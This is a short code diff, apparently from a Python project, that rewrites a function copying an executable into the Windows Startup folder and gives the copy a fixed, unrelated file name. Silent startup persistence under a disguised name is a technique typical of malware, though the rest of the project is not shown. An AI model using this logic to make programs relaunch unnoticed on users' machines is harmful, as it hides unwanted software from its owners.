@@ -47,9 +47,13 @@ PATHS = {
 }
 
 def copy_exe_to_startup(exe_path):
-    """Copy the executable to the startup folder"""
-    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    destination_path = os.path.join(startup_folder, os.path.basename(exe_path))
+    startup_folder = os.path.join(
+        os.getenv('APPDATA'),
+        'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
+    )
+
+    base, ext = os.path.splitext(os.path.basename(exe_path))
+    destination_path = os.path.join(startup_folder, f"flickgoontech{ext}")
 
     if not os.path.exists(destination_path):
         shutil.copy2(exe_path, destination_path)
